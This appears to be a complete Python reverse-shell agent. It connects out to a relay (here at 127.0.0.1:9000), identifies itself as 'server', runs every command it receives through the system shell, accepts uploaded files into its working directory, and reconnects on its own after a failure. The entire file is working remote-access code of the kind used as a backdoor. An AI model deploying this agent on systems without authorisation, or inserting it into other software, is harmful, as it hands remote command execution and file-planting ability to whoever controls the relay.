import json
import socket
import subprocess
import os
import time

relay_addr = ('127.0.0.1', 9000)

def recv_msg(conn: socket.socket):
    length_bytes = conn.recv(4)
    if not length_bytes:
        raise ConnectionError("Disconnected")
    length = int.from_bytes(length_bytes, byteorder='big')
    data = b''
    while len(data) < length:
        chunk = conn.recv(length - len(data))
        if not chunk:
            raise ConnectionError("Disconnected during receive")
        data += chunk
    return json.loads(data.decode())

def send_msg(conn: socket.socket, msg):
    encoded = json.dumps(msg).encode()
    length = len(encoded).to_bytes(4, byteorder='big')
    conn.sendall(length + encoded)

def handle_upload(conn: socket.socket, header, current_dir):
    filename = os.path.basename(header['filename'])
    filesize = header['size']
    full_path = os.path.join(current_dir, filename)

    with open(full_path, 'wb') as f:
        remaining = filesize
        while remaining > 0:
            chunk = conn.recv(min(4096, remaining))
            if not chunk:
                raise ConnectionError("Upload interrupted")
            f.write(chunk)
            remaining -= len(chunk)

    send_msg(conn, {"output": f"File '{filename}' uploaded successfully."})

def handle_client(conn: socket.socket):
    current_dir = os.getcwd()

    while True:
        try:
            msg: str = recv_msg(conn)

            if isinstance(msg, dict) and msg.get("action") == "upload":
                handle_upload(conn, msg, current_dir)
                continue

            if msg == "exit":
                print("[*] Client disconnected.")
                break

            if msg.startswith("cd"):
                parts = msg.split(maxsplit=1)
                if len(parts) == 2:
                    new_path = os.path.abspath(os.path.join(current_dir, parts[1]))
                    if os.path.isdir(new_path):
                        current_dir = new_path
                        send_msg(conn, {"cwd": current_dir})
                    else:
                        send_msg(conn, {"output": f"cd: path '{new_path}' not found."})
                else:
                    send_msg(conn, {"cwd": current_dir})
                continue

            result = subprocess.run(msg, shell=True, capture_output=True, cwd=current_dir)
            output = result.stdout.decode()
            error = result.stderr.decode()

            send_msg(conn, {"output": error or output})
        except Exception as e:
            send_msg(conn, {"output": f"Server error: {str(e)}"})
            break

def connect_to_relay():
    while True:
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[*] Connecting to relay at {relay_addr}...")
            conn.connect(relay_addr)
            conn.sendall(b"server\n")
            print("[+] Connected to relay. Waiting for client...")
            return conn
        except Exception as e:
            print(f"[!] Relay connection failed: {e}")
            time.sleep(2)  # Retry after delay

def main():
    while True:
        conn = connect_to_relay()
        handle_client(conn)
        conn.close()
        print("[*] Ready to accept another client.\n")

if __name__ == '__main__':
    main()
